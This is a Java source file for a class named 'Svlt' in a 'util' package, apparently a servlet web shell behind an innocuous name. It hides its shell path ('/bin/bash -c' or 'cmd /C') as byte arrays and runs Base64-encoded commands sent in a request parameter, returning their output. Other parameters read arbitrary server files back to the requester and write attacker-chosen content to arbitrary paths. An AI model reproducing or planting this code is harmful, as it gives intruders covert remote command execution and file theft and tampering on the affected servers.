package util;

import javax.servlet.ServletOutputStream;
import javax.xml.bind.DatatypeConverter;
import java.io.*;
import java.net.URLDecoder;

public class Svlt extends BaseX3 {
   public Svlt() {
   }

   public boolean c() throws Exception {
      String var1 = this.r.getParameter("ls");
      String var2 = new String(new byte[]{47, 98, 105, 110, 47, 98, 97, 115, 104});
      String var3 = new String(new byte[]{45, 99});
      String var4;
      if (var1 != null) {
         var1 = new String(DatatypeConverter.parseBase64Binary(var1), "utf-8");
         if ("whoami".equals(var1)) {
            var4 = System.getProperty("user.name");
            if (var4 != null) {
               this.print(var4);
               return true;
            }
         }

         if ("info".equals(var1)) {
            var4 = System.getProperties().toString().replaceAll("\\s*[,;]\\s*", "\n");
            this.print(var4);
            return true;
         }
      }

      var4 = String.valueOf(File.separatorChar);
      if (var4.equals("\\")) {
         var2 = new String(new byte[]{99, 109, 100});
         var3 = new String(new byte[]{47, 67});
      }

      String var5 = this.r.getParameter("f");
      if (var5 != null) {
         try {
            var5 = URLDecoder.decode(var5, "utf-8");
            String var6;
            if ((var6 = this.r.getParameter("fv")) != null) {
               try {
                  var6 = URLDecoder.decode(var6, "utf-8");
               } catch (Exception var15) {
               }

               String var19 = "[;,]";
               String[] var22 = var5.split(var19);
               String[] var24 = new String[]{var22[0]};
               if (2 == var22.length) {
                  String var7 = System.getProperty(var22[0]);
                  if (var7 != null) {
                     var24 = var7.split(File.pathSeparator);
                  }
               }

               for(int var26 = 0; var26 < var24.length; ++var26) {
                  if (2 <= var22.length) {
                     var24[var26] = var24[var26] + File.pathSeparator + var22[1];
                  }

                  try {
                     FileOutputStream var28 = new FileOutputStream(var24[var26]);
                     var28.write(var6.getBytes("utf-8"));
                     var28.flush();
                     var28.close();
                  } catch (Exception var14) {
                  }
               }
            } else {
               FileInputStream var18 = new FileInputStream(var5);
               boolean var20 = false;
               byte[] var23 = new byte[4096];
               ServletOutputStream var25 = this.rp.getOutputStream();

               int var21;
               while(-1 < (var21 = var18.read(var23, 0, 4096))) {
                  var25.write(var23, 0, var21);
               }

               var25.flush();
               var25.close();
               var18.close();
            }

            return true;
         } catch (Exception var17) {
         }
      }

      if (var1 != null) {
         Process var8 = null;
         byte[] var9 = new byte[2048];
         OutputStream var10 = null;
         InputStream var11 = null;
         boolean var12 = false;

         try {
            var8 = Runtime.getRuntime().exec(new String[]{var2, var3, var1});
            var10 = var8.getOutputStream();
            var11 = var8.getInputStream();
            int var27 = var11.read(var9, 0, var9.length);

            for(String var13 = ""; -1 < var27; var27 = var11.read(var9, 0, var9.length)) {
               if (var27 > 0) {
                  var13 = new String(var9, 0, var27);
                  this.print(var13);
               }
            }

            var10.close();
            var11.close();
         } catch (Exception var16) {
         }
      }

      return true;
   }
}
